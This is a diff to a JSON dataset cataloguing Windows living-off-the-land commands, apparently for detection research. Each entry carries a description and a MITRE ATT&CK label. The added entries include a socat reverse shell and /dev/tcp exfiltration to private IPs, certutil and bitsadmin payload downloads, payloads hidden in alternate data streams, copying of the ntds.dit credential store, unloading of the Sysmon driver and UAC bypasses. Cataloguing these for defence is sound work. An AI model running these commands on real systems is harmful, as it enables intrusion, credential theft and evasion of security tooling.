@@ -73,6 +73,42 @@
     },
     {
         "ID":7,
+        "Command":"bash.exe -c \"socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\"",
+        "Description":"Executes a reverse shell File used by Windows subsystem for Linux",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":8,
+        "Command":"bash.exe -c 'cat {PATH:.zip} > \/dev\/tcp\/192.168.1.10\/24'",
+        "Description":"Exfiltrate data File used by Windows subsystem for Linux",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":9,
+        "Command":"bash.exe -c \"{CMD}\"",
+        "Description":"Executes executable from bash.exe File used by Windows subsystem for Linux",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":10,
         "Command":"bitsadmin \/create 1 bitsadmin \/addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin \/SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin \/RESUME 1 bitsadmin \/complete 1",
         "Description":"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job. Used for managing background intelligent transfer",
         "RiskScore":"",
@@ -84,7 +120,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":8,
+        "ID":11,
+        "Command":"bitsadmin \/create 1 bitsadmin \/addfile 1 https:\/\/live.sysinternals.com\/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin \/RESUME 1 bitsadmin \/complete 1",
+        "Description":"Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job. Used for managing background intelligent transfer",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":12,
+        "Command":"bitsadmin \/create 1 & bitsadmin \/addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin \/RESUME 1 & bitsadmin \/Complete 1 & bitsadmin \/reset",
+        "Description":"Command for copying cmd.exe to another folder Used for managing background intelligent transfer",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":13,
+        "Command":"bitsadmin \/create 1 & bitsadmin \/addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin \/SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin \/RESUME 1 & bitsadmin \/Reset",
+        "Description":"One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job. Used for managing background intelligent transfer",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":14,
         "Command":"certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}",
         "Description":"Loads the target DLL file Used for installing certificates",
         "RiskScore":"",
@@ -96,7 +168,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":9,
+        "ID":15,
+        "Command":"certoc.exe -GetCACAPS {REMOTEURL:.ps1}",
+        "Description":"Downloads text formatted files Used for installing certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":16,
         "Command":"CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}",
         "Description":"Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument). Used for requesting and managing certificates",
         "RiskScore":"",
@@ -108,7 +192,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":10,
+        "ID":17,
+        "Command":"CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}",
+        "Description":"Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal. Used for requesting and managing certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":18,
         "Command":"certutil.exe -urlcache -split -f {REMOTEURL:.exe} {PATH:.exe}",
         "Description":"Download and save executable to disk in the current folder. Windows binary used for handling certificates",
         "RiskScore":"",
@@ -120,7 +216,67 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":11,
+        "ID":19,
+        "Command":"certutil.exe -verifyctl -f -split {REMOTEURL:.exe} {PATH:.exe}",
+        "Description":"Download and save executable to disk in the current folder. Windows binary used for handling certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":20,
+        "Command":"certutil.exe -urlcache -split -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt",
+        "Description":"Download and save a PS1 file to an Alternate Data Stream (ADS). Windows binary used for handling certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":21,
+        "Command":"certutil -encode {PATH} {PATH:.base64}",
+        "Description":"Command to encode a file using Base64 Windows binary used for handling certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1027.013",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":22,
+        "Command":"certutil -decode {PATH:.base64} {PATH}",
+        "Description":"Command to decode a Base64 encoded file. Windows binary used for handling certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1140",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":23,
+        "Command":"certutil -decodehex {PATH:.hex} {PATH}",
+        "Description":"Command to decode a hexadecimal-encoded file. Windows binary used for handling certificates",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1140",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":24,
         "Command":"cmd.exe \/c echo regsvr32.exe ^\/s ^\/u ^\/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat",
         "Description":"Add content to an Alternate Data Stream (ADS). The command-line interpreter in Windows",
         "RiskScore":"",
@@ -132,7 +288,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":12,
+        "ID":25,
+        "Command":"cmd.exe - < {PATH}:payload.bat",
+        "Description":"Execute payload.bat stored in an Alternate Data Stream (ADS). The command-line interpreter in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1059.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":26,
+        "Command":"type {PATH_SMB} > {PATH_ABSOLUTE}",
+        "Description":"Downloads a specified file from a WebDAV server to the target file. The command-line interpreter in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":27,
+        "Command":"type {PATH_ABSOLUTE} > {PATH_SMB}",
+        "Description":"Uploads a specified file to a WebDAV server. The command-line interpreter in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1048.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":28,
         "Command":"cmdkey \/list",
         "Description":"List cached credentials creates, lists, and deletes stored user names and passwords or credentials.",
         "RiskScore":"",
@@ -144,7 +336,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":13,
+        "ID":29,
         "Command":"cmdl32 \/vpn \/lan %cd%\\config",
         "Description":"Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter. Microsoft Connection Manager Auto-Download",
         "RiskScore":"",
@@ -156,7 +348,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":14,
+        "ID":30,
         "Command":"cmstp.exe \/ni \/s {PATH_ABSOLUTE:.inf}",
         "Description":"Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. Installs or removes a Connection Manager service profile.",
         "RiskScore":"",
@@ -168,7 +360,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":15,
+        "ID":31,
+        "Command":"cmstp.exe \/ni \/s {REMOTEURL:.inf}",
+        "Description":"Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll. Installs or removes a Connection Manager service profile.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":32,
         "Command":"colorcpl {PATH}",
         "Description":"Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\. Binary that handles color management",
         "RiskScore":"",
@@ -180,7 +384,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":16,
+        "ID":33,
         "Command":"ComputerDefaults.exe",
         "Description":"Upon execution, ComputerDefaults.exe checks two registry values at HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\open\\command; if these are set by an attacker, the set command will be executed as a high-integrity process without a UAC prompt being displayed to the user. See 'resources' for which registry keys\/values to set. ComputerDefaults.exe is a Windows system utility for managing default applications for tasks like web browsing, emailing, and media playback.",
         "RiskScore":"",
@@ -192,7 +396,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":17,
+        "ID":34,
         "Command":"ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}",
         "Description":"Upload file, credentials or data exfiltration in general Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
         "RiskScore":"",
@@ -204,7 +408,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":18,
+        "ID":35,
+        "Command":"ConfigSecurityPolicy.exe {REMOTEURL}",
+        "Description":"It will download a remote payload and place it in INetCache. Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":36,
         "Command":"conhost.exe {CMD}",
         "Description":"Execute a command line with conhost.exe as parent process Console Window host",
         "RiskScore":"",
@@ -216,7 +432,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":19,
+        "ID":37,
+        "Command":"conhost.exe --headless {CMD}",
+        "Description":"Execute a command line with conhost.exe as parent process Console Window host",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":38,
         "Command":"control.exe {PATH_ABSOLUTE}:evil.dll",
         "Description":"Execute evil.dll which is stored in an Alternate Data Stream (ADS). Binary used to launch controlpanel items in Windows",
         "RiskScore":"",
@@ -228,7 +456,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":20,
+        "ID":39,
+        "Command":"control.exe {PATH_ABSOLUTE:.cpl}",
+        "Description":"Execute .cpl file. A CPL is a DLL file with CPlApplet export function) Binary used to launch controlpanel items in Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1218.002",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":40,
         "Command":"csc.exe -out:{PATH:.exe} {PATH:.cs}",
         "Description":"Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path. Binary file used by .NET Framework to compile C# code",
         "RiskScore":"",
@@ -240,7 +480,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":21,
+        "ID":41,
+        "Command":"csc -target:library {PATH:.cs}",
+        "Description":"Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name. Binary file used by .NET Framework to compile C# code",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1127",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":42,
         "Command":"cscript \/\/e:vbscript {PATH_ABSOLUTE}:script.vbs",
         "Description":"Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS). Binary used to execute scripts in Windows",
         "RiskScore":"",
@@ -252,7 +504,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":22,
+        "ID":43,
         "Command":"CustomShellHost.exe",
         "Description":"Executes explorer.exe (with command-line argument \/NoShellRegistrationCheck) if present in the current working folder. A host process that is used by custom shells when using Windows in Kiosk mode.",
         "RiskScore":"",
@@ -264,7 +516,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":23,
+        "ID":44,
         "Command":"DataSvcUtil \/out:{PATH_ABSOLUTE} \/uri:{REMOTEURL}",
         "Description":"Upload file, credentials or data exfiltration in general DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.",
         "RiskScore":"",
@@ -276,7 +528,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":24,
+        "ID":45,
         "Command":"set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd \/c desktopimgdownldr.exe \/lockscreenurl:{REMOTEURL} \/eventName:desktopimgdownldr",
         "Description":"Downloads the file and sets it as the computer's lockscreen Windows binary used to configure lockscreen\/desktop image",
         "RiskScore":"",
@@ -288,7 +540,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":25,
+        "ID":46,
         "Command":"DeviceCredentialDeployment",
         "Description":"Grab the console window handle and set it to hidden Device Credential Deployment",
         "RiskScore":"",
@@ -300,7 +552,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":26,
+        "ID":47,
         "Command":"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",
         "Description":"Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host) ClickOnce engine in Windows used by .NET",
         "RiskScore":"",
@@ -312,7 +564,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":27,
+        "ID":48,
         "Command":"diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab",
         "Description":"Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file. Binary that package existing files into a cabinet (.cab) file",
         "RiskScore":"",
@@ -324,7 +576,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":28,
+        "ID":49,
+        "Command":"diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}",
+        "Description":"Download and compress a remote file and store it in a CAB file on local machine. Binary that package existing files into a cabinet (.cab) file",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":50,
+        "Command":"diantz \/f {PATH:.ddf}",
+        "Description":"Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification. Binary that package existing files into a cabinet (.cab) file",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1036",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":51,
         "Command":"diskshadow.exe \/s {PATH:.txt}",
         "Description":"Execute commands using diskshadow.exe from a prepared diskshadow script. Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
         "RiskScore":"",
@@ -336,7 +612,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":29,
+        "ID":52,
+        "Command":"diskshadow> exec {PATH:.exe}",
+        "Description":"Execute commands using diskshadow.exe to spawn child process Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":53,
         "Command":"dnscmd.exe dc1.lab.int \/config \/serverlevelplugindll {PATH_SMB:.dll}",
         "Description":"Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details. A command-line interface for managing DNS servers",
         "RiskScore":"",
@@ -348,7 +636,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":30,
+        "ID":54,
         "Command":"esentutl.exe \/y {PATH_ABSOLUTE:.source.vbs} \/d {PATH_ABSOLUTE:.dest.vbs} \/o",
         "Description":"Copies the source VBS file to the destination VBS file. Binary for working with Microsoft Joint Engine Technology (JET) database",
         "RiskScore":"",
@@ -360,7 +648,67 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":31,
+        "ID":55,
+        "Command":"esentutl.exe \/y {PATH_ABSOLUTE:.exe} \/d {PATH_ABSOLUTE}:file.exe \/o",
+        "Description":"Copies the source EXE to an Alternate Data Stream (ADS) of the destination file. Binary for working with Microsoft Joint Engine Technology (JET) database",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":56,
+        "Command":"esentutl.exe \/y {PATH_ABSOLUTE}:file.exe \/d {PATH_ABSOLUTE:.exe} \/o",
+        "Description":"Copies the source Alternate Data Stream (ADS) to the destination EXE. Binary for working with Microsoft Joint Engine Technology (JET) database",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":57,
+        "Command":"esentutl.exe \/y {PATH_SMB:.exe} \/d {PATH_ABSOLUTE}:file.exe \/o",
+        "Description":"Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file. Binary for working with Microsoft Joint Engine Technology (JET) database",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":58,
+        "Command":"esentutl.exe \/y {PATH_SMB:.source.exe} \/d {PATH_SMB:.dest.exe} \/o",
+        "Description":"Copies the source EXE to the destination EXE file Binary for working with Microsoft Joint Engine Technology (JET) database",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":59,
+        "Command":"esentutl.exe \/y \/vss c:\\windows\\ntds\\ntds.dit \/d {PATH_ABSOLUTE:.dit}",
+        "Description":"Copies a (locked) file using Volume Shadow Copy Binary for working with Microsoft Joint Engine Technology (JET) database",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1003.003",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":60,
         "Command":"eventvwr.exe",
         "Description":"During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user. Displays Windows Event Logs in a GUI window.",
         "RiskScore":"",
@@ -372,7 +720,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":32,
+        "ID":61,
+        "Command":"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe",
+        "Description":"During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews file. This file can be created using https:\/\/github.com\/pwntester\/ysoserial.net Displays Windows Event Logs in a GUI window.",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1548.002",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":62,
         "Command":"expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}",
         "Description":"Copies source file to destination. Binary that expands one or more compressed files",
         "RiskScore":"",
@@ -384,7 +744,31 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":33,
+        "ID":63,
+        "Command":"expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}",
+        "Description":"Copies source file to destination. Binary that expands one or more compressed files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":64,
+        "Command":"expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat",
+        "Description":"Copies source file to destination Alternate Data Stream (ADS) Binary that expands one or more compressed files",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":65,
         "Command":"explorer.exe \/root,\"{PATH_ABSOLUTE:.exe}\"",
         "Description":"Execute specified .exe with the parent process spawning from a new instance of explorer.exe Binary used for managing files and system components within Windows",
         "RiskScore":"",
@@ -396,7 +780,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":34,
+        "ID":66,
+        "Command":"explorer.exe {PATH_ABSOLUTE:.exe}",
+        "Description":"Execute notepad.exe with the parent process spawning from a new instance of explorer.exe Binary used for managing files and system components within Windows",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1202",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":67,
         "Command":"Extexport.exe {PATH_ABSOLUTE:folder} foo bar",
         "Description":"Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll. Load a DLL located in the c:\\test folder with a specific name.",
         "RiskScore":"",
@@ -408,7 +804,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":35,
+        "ID":68,
         "Command":"extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe",
         "Description":"Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file. Extract to ADS, copy or overwrite a file with Extrac32.exe",
         "RiskScore":"",
@@ -420,7 +816,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":36,
+        "ID":69,
+        "Command":"extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe",
+        "Description":"Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file. Extract to ADS, copy or overwrite a file with Extrac32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":70,
+        "Command":"extrac32 \/Y \/C {PATH_SMB} {PATH_ABSOLUTE}",
+        "Description":"Copy the source file to the destination file and overwrite it. Extract to ADS, copy or overwrite a file with Extrac32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":71,
+        "Command":"extrac32.exe \/C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}",
+        "Description":"Command for copying file from one folder to another Extract to ADS, copy or overwrite a file with Extrac32.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":72,
         "Command":"findstr \/V \/L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe",
         "Description":"Searches for the string W3AllLov3LolBas, since it does not exist (\/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file. Write to ADS, discover, or download files with Findstr.exe",
         "RiskScore":"",
@@ -432,7 +864,43 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":37,
+        "ID":73,
+        "Command":"findstr \/V \/L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe",
+        "Description":"Searches for the string W3AllLov3LolBas, since it does not exist (\/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file. Write to ADS, discover, or download files with Findstr.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1564.004",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"script",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":74,
+        "Command":"findstr \/S \/I cpassword \\\\sysvol\\policies\\*.xml",
+        "Description":"Search for stored password in Group Policy files stored on SYSVOL. Write to ADS, discover, or download files with Findstr.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1552.001",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":75,
+        "Command":"findstr \/V \/L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}",
+        "Description":"Searches for the string W3AllLov3LolBas, since it does not exist (\/V) file.exe is downloaded to the target file. Write to ADS, discover, or download files with Findstr.exe",
+        "RiskScore":"",
+        "Offensive-Malware-Benign":"",
+        "MitreAttackClassification":"T1105",
+        "ProgrammingLanguage":"",
+        "CMD_Script":"command",
+        "DynTested":"",
+        "ObfuscationLevel":""
+    },
+    {
+        "ID":76,
         "Command":"finger user@example.host.com | more +2 | cmd",
         "Description":"Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process. Displays information about a user or users on a specified remote computer that is running the Finger service or daemon",
         "RiskScore":"",
@@ -444,7 +912,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":38,
+        "ID":77,
         "Command":"fltMC.exe unload SysmonDrv",
         "Description":"Unloads a driver used by security agents Filter Manager Control Program used by Windows",
         "RiskScore":"",
@@ -456,7 +924,7 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":39,
+        "ID":78,
         "Command":"forfiles \/p c:\\windows\\system32 \/m notepad.exe \/c \"{CMD}\"",
         "Description":"Executes specified command since there is a match for notepad.exe in the c:\\windows\\System32 folder. Selects and executes a command on a file or set of files. This command is useful for batch processing.",
         "RiskScore":"",
@@ -468,7 +936,19 @@
         "ObfuscationLevel":""
     },
     {
-        "ID":40,
+        "ID":79,
+        "Command":"forfiles \/p c:\\windows\\system32 \/m notepad.exe \/c \"{PATH_ABSOLUTE}:evil.exe\"",
+        "Description":"Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder. Selects and executes a command on a file or set of files. This command is useful for batch processing.",
+        "RiskScore":"",
